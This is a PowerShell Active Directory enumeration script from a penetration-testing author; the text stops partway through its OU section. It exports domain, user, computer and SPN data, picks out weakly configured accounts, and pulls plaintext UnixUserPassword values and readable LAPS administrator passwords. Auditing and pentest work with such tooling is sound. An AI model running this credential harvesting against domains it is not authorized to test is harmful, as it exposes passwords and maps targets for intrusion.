# -------------------------------------------
# Function: Get-DomainInfoADPS
# This function requires the Active Directory 
# PowerShell Module
# Author: Scott Sutherland (@_nullbind), NetSPI
# Version: 1.5
# Things that would be nice to have:
# - Dump the kerb tickets.
# - Add consumable finding output.
# - Add dump local admin list and associated systems
# - Add dump of gpo linked to domain
# - Add dump of gpo link to sites
# - Add foreign users and groups
# - Add download options for netlogon,GPP,GPO
# - Add support for ldap options
# - Bake in the ad ps module
# Command Example from domain system:     Get-DomainInfoADPS
# Command Example from non domain system: Get-DomainInfoADPS -Server 192.168.1.1 -Username domain\user -Password 'MyPassword!'
# -------------------------------------------
function Get-DomainInfoADPS
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$Server,

        [Parameter(Mandatory=$false,
        HelpMessage="LDAP Filter.")]
        [string]$LdapFilter = "",

        [Parameter(Mandatory=$false,
        HelpMessage="LDAP path.")]
        [string]$LdapPath,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree"
    )
    Begin
    {
        Write-Output "--------------------------------------------"
        Write-Output "         -=( Get-DomainInfoADPS )=-         "       
        Write-Output "--------------------------------------------"
        Write-Output "Author: Scott Sutherland(@_nullbind), NetSPI"
        Write-Output " "

        # Import the AD PS modules
        Import-Module ActiveDirectory  
       
        # Check for ADPS module
        if ((Get-Command -Module "ActiveDirectory").count -eq 0){
            Write-Output "Active Directory PowerShell module not found."
            Write-Output "Aborting."
            return
        }    

        # Create PS Credential object
        if($Password){
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }                   

        # Get the current path
        $CurrentPath =  pwd | select path -ExpandProperty path                          

        # Check for provide DC and Credentials
        if($username -and $password){
                   
            # Create randomish name for dynamic mount point 
            $set = "abcdefghijklmnopqrstuvwxyz".ToCharArray();
            $result += $set | Get-Random -Count 10
            $DriveName = [String]::Join("",$result)               

            # Map a temp drive to the DC 

            Write-Output "Connecting to $Server as $username..."
            If ($Credential.UserName){
        
                # Mount the drive
                try{ New-PSDrive -PSProvider ActiveDirectory -Name "$DriveName" -Root "" -Credential $Credential -Server $Server -ErrorAction Stop | Out-Null }
                catch{ Write-Output "Authenticating to $Server as $username failed.";break}                
            }

            # Change directory to AD PS Drive
            $DrivePath = $DriveName + ':'
            cd $DrivePath
        }                 
    }

    Process
    {        
        Write-Output "Getting basic domain Information..."
        $AdDomain = Get-AdDomain | Select DNSRoot -ExpandProperty DNSRoot
        Write-Output " - Domain: $AdDomain"
        if (Test-Path "$CurrentPath\$AdDomain"){
            Write-Output " - The output directory `"$AdDomain`" already exists. Aborting."
            cd $CurrentPath
            break
        }else{
            mkdir "$CurrentPath\$AdDomain" | Out-Null
        }

        # Get Domains
        # Get-AdDomain - provides more information        
        Get-AdDomain | Select Forest, DomainSID, Name, NetBIOSName, DistinguishedName, DNSRoot, ParentDomain | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Domain.csv"

        # Get Forests
        # Get-AdForest - provides more information
        Get-AdForest | select Name,RootDomain,SchemaMaster,ForestMode | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Domain-Forest.csv"
        $Forest_RootDomain = Get-AdForest | select RootDomain -ExpandProperty RootDomain
        
        # Get Domain Trusts
        $Domain_Trusts = Get-AdTrust –Filter * -Properties * 
        $Domain_Trusts_C = $Domain_Trusts | measure | select count -ExpandProperty count
        Write-Output " - Found $Domain_Trusts_C trusts"
        $Domain_Trusts | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Domain-Trusts.csv"

        # Get Domain controllers
        $Domain_Controllers = Get-ADDomainController -Filter * 
        $Domain_Controllers_C = $Domain_Controllers | measure | select count -ExpandProperty count
        Write-Output " - Found $Domain_Controllers_C domain controllers"
        $Domain_Controllers | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Computers-DCs.csv"

        # Get sites
        $Sites = $Domain_Controllers | Select site -Unique
        $Sites | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Domain-Sites.csv"
        $Sites_C = $Sites | measure | select count -ExpandProperty count
        Write-Output " - Found $Sites_C sites"
        
        # Get subnets
        $Subnets = Get-ADReplicationSubnet -filter * -Properties * | Select Name, Site, Location, Description
        $Subnets | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Domain-Subnets.csv" 
        $Subnets_c = $Subnets | measure | select count -ExpandProperty count
        Write-Output " - Found $Subnets_c subnets"
        
        # Grab Account Policy
        Get-ADDefaultDomainPasswordPolicy | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Account-Policy.csv"  
        Write-Output " - Found account policy"

        # ------------------------------------------------
        # Group Targets
        # ------------------------------------------------

        Write-Output "Getting Group Information..."

        $GetGroups = Get-AdGroup -Properties * -Filter * 
        $Groups = $GetGroups | Select SamAccountName,SID,Name,CanonicalName,CN,DistinguishedName,DisplayName,ObjectGUID,ObjectCategory,Created,CreateTimeStamp,whenChanged,whenCreated,Description,GroupScope,isCriticalSystemObject,adminCount,ProtectedFromAccidentalDeletion
        $Groups | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Groups-All.csv" 
        $Groups_C = $Groups | measure | select count -ExpandProperty count
        Write-Output " - Found $Groups_C groups"

        # Check for protected groups
        $GroupsProtected =  $Groups | Where-Object adminCount –eq 1 
        $GroupsProtected | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Groups-Protected.csv" 
        $GroupsProtected_C = $GroupsProtected | measure | select count -ExpandProperty count
        Write-Output " - Found $GroupsProtected_C groups with adminCount of 1 (Protected)"
               
        # Get senstive group members
        $GroupList = @("Enterprise Admins","Domain Admins","DNSAdmins")
        $GroupList | 
        ForEach-Object {
            $CurrentGroup = $_
            $CurrentGroup2 = $CurrentGroup -replace '\s',''
            $GroupMembers = Get-ADGroupMember -Identity "$CurrentGroup“ –Recursive
            $GroupMembers | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Groups-$CurrentGroup2.csv"
            $GroupMembers_C = ($GroupMembers | Measure) | measure | select count -ExpandProperty count
            Write-Output " - Found $GroupMembers_C users in $_"
        }
                        
        # ------------------------------------------------
        # User Targets
        # ------------------------------------------------

        Write-Output "Getting User Information..."
        
        # Get all domain users and properties
        $DomainUsersALL = Get-AdUser –Filter * -Properties *
        $DomainUsers = $DomainUsersALL | Select SamAccountName,UserPrincipalName,GivenName,Surname,SID,Name,CanonicalName,CN,DistinguishedName,DisplayName,EmailAddress,mail,mailNickname,Fax,EmployeeNumber,State,StreetAddress,Manager,mDBUseDefaults,Created,CreateTimeStamp,Modified,whenChanged,whenCreated,ScriptPath,HomeDirectory,HomeDrive,homeMDB,HomePhone,Initials,msExchALObjectVersion,msExchHomeServerName,msExchRBACPolicyLink,msExchWhenMailboxCreated,msTSLicenseVersion,OfficePhone,Office,Organization,isCriticalSystemObject,Title,TrustedForDelegation,TrustedToAuthForDelegation,UseDESKeyOnly,Description,Department,Division,Company,AccountLockoutTime,adminCount,AllowReversiblePasswordEncryption,BadLogonCount,badPwdCount,CannotChangePassword,LastBadPasswordAttempt,LastLogonDate,LockedOut,legacyExchangeDN,logonCount,LogonWorkstations,PasswordExpired,PasswordNeverExpires,PasswordNotRequired,PostalCode,primaryGroupID,ProtectedFromAccidentalDeletion,Enabled,ServicePrincipalNames,DoesNotRequirePreAuth
        $DomainUsers | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-All.csv"
        $DomainUsers_C = $DomainUsers | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_C domain users "

        # Get domain users that are enabled
        $DomainUsers_Enabled = $DomainUsers | Where-Object Enabled –like “true” 
        $DomainUsers_Enabled | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-Enabled.csv"
        $DomainUsers_Enabled_C = $DomainUsers_Enabled | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_Enabled_C users enabled"

        # Get domain users that are disabled
        $DomainUsers_Disabled = $DomainUsers | Where-Object Enabled –like “false” 
        $DomainUsers_Disabled | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-Disabled.csv"
        $DomainUsers_Disabled_C = $DomainUsers_Disabled | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_Disabled_C users Disabled"

        # Get domain users that are locked
        $DomainUsers_Locked = Get-ADObject -LDAPFilter ‘(&(sAMAccountType=805306368)(lockoutTime>=1))’ 
        $DomainUsers_Locked | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-Locked.csv"
        $DomainUsers_Locked_C = $DomainUsers_Locked | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_Locked_C users Locked"
        
        # Get domain users that have the adminCount flag set (Meaning the are/were Domain Admins)
        $Domain_Users_Protected = $DomainUsers | Where-Object adminCount –eq 1
        $Domain_Users_Protected | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-Protected.csv"
        $Domain_Users_Protected_C = $Domain_Users_Protected | measure | select count -ExpandProperty count
        Write-Output " - Found $Domain_Users_Protected_C users with adminCount of 1 (Protected)"
        
        # Get domain users with a description that contains the keyword “pass” 
        $DomainUsers_Desc_Pass = $DomainUsers | Where-Object Description -like "*pass*“ 
        $DomainUsers_Desc_Pass| Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-Desc-with-pass.csv"
        $DomainUsers_Desc_Pass_C = $DomainUsers_Desc_Pass | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_Desc_Pass_C users with `"pass`" in their description"

        # Get all domain users allowed to stored passwords with reversible encryption
        $DomainUsers_RevEnc = $DomainUsers | Where-Object AllowReversiblePasswordEncryption -like “true“ 
        $DomainUsers_RevEnc | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-Allow-Rev-Enc.csv"
        $DomainUsers_RevEnc_C = $DomainUsers_RevEnc | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_RevEnc_C users that store password with reversible encryption"

        # Get domain users configured with different types of delegation - 1
        $DomainUsers_Trust4Del = $DomainUsers | Where-Object TrustedForDelegation –like “true”  
        $DomainUsers_Trust4Del | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-TrustedforDelegation.csv"
        $DomainUsers_Trust4Del_C = $DomainUsers_Trust4Del | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_Trust4Del_C users TrustedforDelegation"

        # Get domain users configured with different types of delegation - 2
        $DomainUsers_Trust2Auth4Del = $DomainUsers | Where-Object TrustedToAuthForDelegation –like “true” 
        $DomainUsers_Trust2Auth4Del | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-TrustedToAuthForDelegation.csv"
        $DomainUsers_Trust2Auth4Del_C = $DomainUsers_Trust2Auth4Del | measure | select count -ExpandProperty count 
        Write-Output " - Found $DomainUsers_Trust2Auth4Del_C users TrustedToAuthForDelegation"

        $DomainUsers_AllowedToDelegateto =  $DomainUsersALL| Where-Object msds-allowedToDelegateto –notlike “”  
        $DomainUsers_AllowedToDelegateto | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-msDS-AllowedToDelegateto.csv"
        $DomainUsers_AllowedToDelegateto_C = ($DomainUsers_AllowedToDelegateto | select samaccountname -ExpandProperty samaccountname) | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_AllowedToDelegateto_C users with msDS-AllowedToDelegateto configured"

        $DomainUsers_AllowedToActOnBehalfOfOtherIdentity =  $DomainUsersALL | Where-Object msDS-AllowedToActOnBehalfOfOtherIdentity –notlike “”   
        $DomainUsers_AllowedToActOnBehalfOfOtherIdentity | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-msDS-AllowedToActOnBehalfOfOtherIdentity.csv"
        $DomainUsers_AllowedToActOnBehalfOfOtherIdentity_C = $DomainUsers_AllowedToActOnBehalfOfOtherIdentity | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_Trust2Auth4Del_C users with AllowedToActOnBehalfOfOtherIdentity configured"
        
        # Get domain users configured with different types of delegation – Parsed msDS-AllowedToDelegateto
        $DomainUsersALL | Where-Object msds-allowedToDelegateto –notlike “” -ErrorAction SilentlyContinue | 
        ForEach-Object {

            $SamAccountName = $_.samaccountname
            $DelegationList = $_."msds-allowedToDelegateto"

            $DelegationList |
            ForEach-Object {
        
                $DelegatedObject = New-Object PSObject                                       
                $DelegatedObject | add-member Noteproperty SamAccountName $samaccountname
                $DelegatedObject | add-member Noteproperty msds-allowedToDelegateto $_
                $DelegatedObject
            }
        } | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-msDS-AllowedToDelegateto-Parsed.csv"

        # Get domain users configured with different types of delegation – Parsed AllowedToActOnBehalfOfOtherIdentity
        $DomainUsersAll | Where-Object AllowedToActOnBehalfOfOtherIdentity –notlike “” -ErrorAction SilentlyContinue | 
        ForEach-Object {

            $SamAccountName = $_.samaccountname
            $DelegationList = $_."AllowedToActOnBehalfOfOtherIdentity"

            $DelegationList |
            ForEach-Object {
        
                $DelegatedObject = New-Object PSObject                                       
                $DelegatedObject | add-member Noteproperty SamAccountName $samaccountname
                $DelegatedObject | add-member Noteproperty AllowedToActOnBehalfOfOtherIdentity $_
                $DelegatedObject
            }
        } | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-msDS-AllowedToActOnBehalfOfOtherIdentity-Parsed.csv"

        # Get domain users with passwords the do not expire
        $DomainUsers_NoPwExp = $DomainUsers | Where-Object PasswordNeverExpires –like “true” 
        $DomainUsers_NoPwExp | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-No-Pw-Expire.csv"
        $DomainUsers_NoPwExp_C = $DomainUsers_NoPwExp | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_NoPwExp_C users with passwords that do not expire"

        # Get domain users that do not require authentication
        $DomainUsers_NoAuthReq = Get-ADObject –LDAPFilter ‘(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))’ 
        $DomainUsers_NoAuthReq | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-No-Auth-Req.csv"
        $DomainUsers_NoAuthReq_C = $DomainUsers_NoAuthReq | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_NoAuthReq_C users that do not require authentication"

        # Get domain users configured to use DES keys
        $DomainUsers_DesKey = $DomainUsers | Where-Object UseDESKeyOnly –like “true” 
        $DomainUsers_DesKey | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-DesKey.csv"
        $DomainUsers_DesKey_C = $DomainUsers_DesKey | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_DesKey_C users that use DES keys"         

        # Get domain users that with passwords that do not require Kerberos pre-authentication
        $DomainUsers_NoPreAuthReq = $DomainUsers | Where-Object DoesNotRequirePreAuth –like “true”  
        $DomainUsers_NoPreAuthReq | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-No-Pre-Auth-Req.csv"
        $DomainUsers_NoPreAuthReq_C = $DomainUsers_NoPreAuthReq | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_NoPreAuthReq_C users that do not require pre-auth"

        # Get domain users storing a UnixUserPassword
        $DomainUsers_UnixUserPassword = $DomainUsersALL | Where-Object UnixUserPassword –notlike "" | select samaccountname, description, UnixUserPassword
        $UnixPWs = $DomainUsers_UnixUserPassword |
        ForEach-Object{
           
            # Grab fields and decode password
            $SamAccountName = $_.samaccountname
            $Description = $_.description
            $UnixUserPasswordEnc = $_.UnixUserPassword | ForEach-Object {$_};            
            $UnixUserPassword = [System.Text.Encoding]::ASCII.GetString($UnixUserPasswordEnc) 

            # Create object to be returned
            $UnixPasswords = New-Object PSObject                                       
            $UnixPasswords | add-member Noteproperty SamAccountName $SamAccountName
            $UnixPasswords | add-member Noteproperty Description $Description
            $UnixPasswords | add-member Noteproperty UnixUserPassword $UnixUserPassword

            # Return object
            $UnixPasswords
        } 
        $UnixPWs | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-UnixUserPassword.csv"
        $DomainUsers_UnixUserPassword_C = $DomainUsers_UnixUserPassword | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_UnixUserPassword_C users that have a readable Unix password"

        # Get domain users with properties that contain the keyword “pass”
        # update with this and cross add filter for user class 
        # This should be rewrittento accept a list of keywords
        $DefaultProperties = @("AllowReversiblePasswordEncryption","badPasswordTime","CannotChangePassword","LastBadPasswordAttempt","PasswordExpired","PasswordLastSet","PasswordNeverExpires","PasswordNotRequired")
        $DomainUsers_Prop_Pass = $DomainUsersALL | GM |  Where-Object Name -like "*pass*“ | select name -ExpandProperty name
        $DomainUsers_Prop_PassFilter = $DomainUsers_Prop_Pass | Where-Object {$DefaultProperties -notcontains "$_"}
        $DomainUsers_Prop_PassFilter | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-Props-with-Pass.csv"
        $DomainUsers_Prop_Pass_C = $DomainUsers_Prop_PassFilter | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_Prop_Pass_C non-default property names containing `"pass`"" 
               

        # Get domain users with properties that contain the keyword “key”   
        # This should be rewrittento accept a list of keywords     
        $DefaultProperties2 = @("UseDESKeyOnly")
        $DomainUsers_Prop_Key = $DomainUsersAll | GM |  Where-Object Name -like "*key*“ | select name -ExpandProperty name
        $DomainUsers_Prop_KeyFilter = $DomainUsers_Prop_Key | Where-Object {$DefaultProperties2 -notcontains "$_"}
        $DomainUsers_Prop_KeyFilter | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-Props-with-Key.csv"
        $DomainUsers_Prop_Key_C = $DomainUsers_Key_PassFilter | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_Prop_Key_C non-default property names containing `"key`"" 

        # Get domain users used to run services on domain systems 
        # Should add group memberships too 
        Write-Output "Grabbing User SPN Information..."        
        $DomainUsers_SPNs = $DomainUsers | Where ServicePrincipalNames -notlike "" | Select name,samaccountname,description,Enabled,whenCreated,PasswordLastSet,PasswordNeverExpires,ServicePrincipalNames| 
        ForEach-Object {
    
            # Get and create fields
            $name = $_.name; 
            $samaccountname = $_.samaccountname; 
            $spns = $_.ServicePrincipalNames;
            $Enabled = $_.Enabled;
            $whencreated = $_.whenCreated 
            $PasswordLastSet = $_.PasswordLastSet
            $Description = $_.description
            $PasswordNeverExpires = $_.PasswordNeverExpires
            $IsDA = (Get-ADGroupMember -Identity "Domain Admins" -Recursive | Where-Object samaccountname -like "$samaccountname" | Measure-Object) | measure | select count -ExpandProperty count
            $IsEA = (Get-ADGroupMember -Identity "Enterprise Admins" -Recursive | Where-Object samaccountname -like "$samaccountname" | Measure-Object) | measure | select count -ExpandProperty count
            $spns | 

            # Parse SPNs and display results
            ForEach-Object { 
                $SPNObject = New-Object PSObject                                       
                $SPNObject | add-member Noteproperty Name $name
                $SPNObject | add-member Noteproperty SamAccountName $samaccountname
                $SPNObject | add-member Noteproperty Enabled $Enabled
                $SPNObject | add-member Noteproperty whenCreated $whenCreated 
                $SPNObject | add-member Noteproperty PasswordLastSet $PasswordLastSet    
                $SPNObject | add-member Noteproperty PasswordNeverExpires $PasswordNeverExpires
                $SPNObject | add-member Noteproperty Description $Description
                $SPNObject | add-member Noteproperty ServicePrincipalName $_              
                $SPNObject | add-member Noteproperty IsDA $IsDA  
                $SPNObject | add-member Noteproperty IsEA $IsEA            
                $SPNObject
            }
        } 
        $DomainUsers_SPNs | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Users-SPNs.csv"
        $DomainUsers_SPNs_C = $DomainUsers_SPNs | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainUsers_SPNs_C user SPNs"    
                 
        # ------------------------------------------------
        # Computer Targets
        # ------------------------------------------------

        Write-Output "Getting Computer Information..."

        # Get domain computers
        $DomainComputersALL = Get-ADComputer -Properties * -Filter *
        $DomainComputers = $DomainComputersALL | select SamAccountName,Name,AccountExpirationDate,AccountLockoutTime,AccountNotDelegated,AllowReversiblePasswordEncryption,BadLogonCount,CannotChangePassword,CanonicalName,CN,Created,createTimeStamp,Deleted,Description,DisplayName,DistinguishedName,DNSHostName,DoesNotRequirePreAuth,Enabled,HomedirRequired,HomePage,IPv4Address,IPv6Address,isCriticalSystemObject,isDeleted,LastLogonDate,localPolicyFlags,Location,LockedOut,logonCount,ManagedBy,MNSLogonAccount,Modified,modifyTimeStamp,msDS-SupportedEncryptionTypes,msDS-User-Account-Control-Computed,OperatingSystem,OperatingSystemHotfix,OperatingSystemServicePack,OperatingSystemVersion,PasswordExpired,PasswordLastSet,PasswordNeverExpires,PrimaryGroup,primaryGroupID,ProtectedFromAccidentalDeletion,sDRightsEffective,SID,TrustedForDelegation,TrustedToAuthForDelegation,UseDESKeyOnly,userAccountControl,whenChanged,whenCreated,ServicePrincipalNames
        $DomainComputers_C = $DomainComputers | measure | select count -ExpandProperty count
        $DomainComputers | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Computers.csv"
        Write-Output " - Found $DomainComputers_C computers in the domain"

        # Get enabled computers
        $Enabled = $DomainComputers | Where-Object Enabled -like "True“
        $Enabled_c = $Enabled | measure | select count -ExpandProperty count
        $Enabled | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Computers-Enabled.csv"
        Write-Output " - Found $Enabled_c computers enabled" 

        # Get disabled computers
        $Disabled = $DomainComputers | Where-Object Enabled -like “false"
        $Disabled_C = $Disabled | measure | select count -ExpandProperty count
        $Disabled | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Computers-Disabled.csv" 
        Write-Output " - Found $Disabled_C computers disabled" 

        # Get dfs
        $DFS = Get-ADObject -LDAPFilter "(&(objectClass=fTDfs))"
        $DFS_C = $DFS | measure | select count -ExpandProperty count
        $DFS | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Computers-DFS.csv"
        Write-Output " - Found $DFS_C computers with DFS"  

        # Get machine accounts with password older than (default is 30)
        $SixtyDaysAgo = (Get-Date).AddDays(-45).ToFileTimeUtc()
        $OldAccounts = Get-AdObject -LdapFilter "(&(sAMAccountType=805306369)(pwdlastset<=$SixtyDaysAgo))” | select name -ExpandProperty name 
        $Suspect = $DomainComputers | Where-Object {$OldAccounts -contains $_.name} | Where-Object Enabled –like “true” | select samaccountname, description, Enabled, Created,LastLogonDate, OperatingSystem
        $Suspect_C = $Suspect | measure | select count -ExpandProperty count
        $Suspect | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Computers-PwOlderThan45Days.csv" 
        Write-Output " - Found $Suspect_C computers enabled with a password older than 45 days"  

        # Check for readable LAPS passwords
        $LAPS = $DomainComputers | Where-Object ms-MCS-AdmPwd -NotLike ""
        $LAPS_C = $LAPS | measure | select count -ExpandProperty count
        $LAPS | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Computers-LAPS.csv" 
        Write-Output " - Found $LAPS_C computers with readable LAPS passwords"
        
		# Get domain Computers configured with different types of delegation - 1
        $DomainComputers_Trust4Del = $DomainComputers | Where-Object TrustedForDelegation –like “true”  
        $DomainComputers_Trust4Del | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Computers-TrustedforDelegation.csv"
        $DomainComputers_Trust4Del_C = $DomainComputers_Trust4Del | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainComputers_Trust4Del_C Computers TrustedforDelegation"

        # Get domain Computers configured with different types of delegation - 2
        $DomainComputers_Trust2Auth4Del = $DomainComputers | Where-Object TrustedToAuthForDelegation –like “true” 
        $DomainComputers_Trust2Auth4Del | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Computers-TrustedToAuthForDelegation.csv"
        $DomainComputers_Trust2Auth4Del_C = $DomainComputers_Trust2Auth4Del | measure | select count -ExpandProperty count 
        Write-Output " - Found $DomainComputers_Trust2Auth4Del_C Computers TrustedToAuthForDelegation"

        $DomainComputers_AllowedToDelegateto = $DomainComputersALL| Where-Object msds-allowedToDelegateto –notlike “”  
        $DomainComputers_AllowedToDelegateto | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Computers-msDS-AllowedToDelegateto.csv"
        $DomainComputers_AllowedToDelegateto_C = ($DomainComputers_AllowedToDelegateto | select samaccountname -ExpandProperty samaccountname) | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainComputers_AllowedToDelegateto_C Computers with msDS-AllowedToDelegateto configured"

        $DomainComputers_AllowedToActOnBehalfOfOtherIdentity = $DomainComputersALL | Where-Object msDS-AllowedToActOnBehalfOfOtherIdentity –notlike “”   
        $DomainComputers_AllowedToActOnBehalfOfOtherIdentity | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Computers-msDS-AllowedToActOnBehalfOfOtherIdentity.csv"
        $DomainComputers_AllowedToActOnBehalfOfOtherIdentity_C = $DomainComputers_AllowedToActOnBehalfOfOtherIdentity | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainComputers_AllowedToActOnBehalfOfOtherIdentity_C Computers with AllowedToActOnBehalfOfOtherIdentity configured"

        # Get domain computers with properties that contain the keyword “pass”
        # This should be rewritten to accept a list of keywords
        $DefaultProperties = @("AllowReversiblePasswordEncryption","badPasswordTime","CannotChangePassword","LastBadPasswordAttempt","PasswordExpired","PasswordLastSet","PasswordNeverExpires","PasswordNotRequired")
        $DomainComputers_Prop_Pass = $DomainComputersAll | GM |  Where-Object Name -like "*pass*“ | select name -ExpandProperty name
        $DomainComputers_Prop_PassFilter = $DomainComputers_Prop_Pass | Where-Object {$DefaultProperties -notcontains "$_"}
        $DomainComputers_Prop_PassFilter | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Computers-Props-with-Pass.csv"
        $DomainComputers_Prop_Pass_C = $DomainComputers_Prop_PassFilter | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainComputers_Prop_Pass_C non-default property names containing `"pass`""       

        # Get domain Computers with properties that contain the keyword “key”   
        # This should be rewritten to accept a list of keywords     
        $DefaultProperties2 = @("UseDESKeyOnly")
        $DomainComputers_Prop_Key = $DomainComputersALL | GM |  Where-Object Name -like "*key*“ | select name -ExpandProperty name
        $DomainComputers_Prop_KeyFilter = $DomainComputers_Prop_Key | Where-Object {$DefaultProperties2 -notcontains "$_"}
        $DomainComputers_Prop_KeyFilter | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Computers-Props-with-Key.csv"
        $DomainComputers_Prop_Key_C = $DomainComputers_Key_PassFilter | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainComputers_Prop_Key_C non-default property names containing `"key`"" 

        # Get domain computers used to run services on domain systems 
        # Should add group memberships too 
        Write-Output "Grabbing Computer SPN Information..."        
        $DomainComputers_SPNs = $DomainComputers | Where ServicePrincipalNames -notlike "" | Select name,samaccountname,description,Enabled,whenCreated,PasswordLastSet,PasswordNeverExpires,ServicePrincipalNames| 
        ForEach-Object {
    
            # Get and create fields
            $name = $_.name; 
            $samaccountname = $_.samaccountname; 
            $spns = $_.ServicePrincipalNames;
            $Enabled = $_.Enabled;
            $whencreated = $_.whenCreated 
            $PasswordLastSet = $_.PasswordLastSet
            $Description = $_.description
            $PasswordNeverExpires = $_.PasswordNeverExpires 
            $spns | 

            # Parse SPNs and display results
            ForEach-Object { 
                $SPNObject = New-Object PSObject                                       
                $SPNObject | add-member Noteproperty Name $name
                $SPNObject | add-member Noteproperty SamAccountName $samaccountname
                $SPNObject | add-member Noteproperty Enabled $Enabled
                $SPNObject | add-member Noteproperty whenCreated $whenCreated 
                $SPNObject | add-member Noteproperty PasswordLastSet $PasswordLastSet    
                $SPNObject | add-member Noteproperty PasswordNeverExpires $PasswordNeverExpires
                $SPNObject | add-member Noteproperty Description $Description
                $SPNObject | add-member Noteproperty ServicePrincipalName $_                        
                $SPNObject
            }
        } 
        $DomainComputers_SPNs | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-Computers-SPNs.csv"
        $DomainComputers_SPNs_C = $DomainComputers_SPNs | measure | select count -ExpandProperty count
        Write-Output " - Found $DomainComputers_SPNs_C computer SPNs"

        # ------------------------------------------------
        # Group Policy and OU Targets
        # ------------------------------------------------

        Write-Output "Getting OU and Group Policy Information..."
        
        # Get OUs
        $OUs = Get-ADOrganizationalUnit -Filter * -Properties *
        $OUs_C = $OUs | measure | select count -ExpandProperty count
